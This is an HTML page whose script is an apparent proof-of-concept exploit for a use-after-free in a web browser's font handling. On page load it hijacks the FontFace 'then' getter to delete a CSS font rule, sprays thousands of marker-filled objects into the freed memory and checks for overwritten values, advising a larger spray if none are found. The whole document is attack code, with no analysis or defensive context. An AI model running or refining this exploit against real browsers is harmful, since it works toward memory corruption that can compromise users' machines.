<!DOCTYPE html>
<html>
<head>
    <style id="fontStyle">
        @font-face { font-family: 'TargetFont'; src: url(nonexistent.woff); }
    </style>
</head>
<body>
    <div id="status">Status: Preparing...</div>

    <script>
        const status = document.getElementById('status');
        let sprayedObjects = [];

        // Adjusted structure to match likely CSSFontFace size (128-byte block)
        function createFillerObject() {
            return {
                a: 0x41414141, b: 0x42424242, c: 0x43434343, d: 0x44444444,
                e: 0x45454545, f: 0x46464646, g: 0x47474747, h: 0x48484848
            };
        }

        function triggerUAF() {
            status.innerHTML = "Status: Triggering UAF...";
            
            let font = new FontFace('TargetFont', 'local(Arial)', { unicodeRange: 'U+0041' });
            document.fonts.add(font);
            
            Object.defineProperty(FontFace.prototype, 'then', {
                get() {
                    // 1. Delete to free memory
                    document.getElementById('fontStyle').sheet.deleteRule(0);
                    
                    // 2. Aggressive Spray: Fill the freed slot immediately
                    for (let i = 0; i < 5000; i++) {
                        sprayedObjects.push(createFillerObject());
                    }
                    return undefined;
                }
            });

            font.load();
        }

        function verifyExploit() {
            status.innerHTML = "Status: Verifying...";
            let overlap = false;
            
            // Check if any object has been overwritten (Structure ID or data change)
            for (let i = 0; i < sprayedObjects.length; i++) {
                if (sprayedObjects[i].a !== 0x41414141) {
                    overlap = true;
                    status.innerHTML = "SUCCESS: Overlap detected at index " + i;
                    break;
                }
            }
            
            if (!overlap) status.innerHTML = "Status: Buffers intact. (Try increasing spray count or padding)";
        }

        window.onload = () => {
            setTimeout(triggerUAF, 500);
            setTimeout(verifyExploit, 2000);
        };
    </script>
</body>
</html>
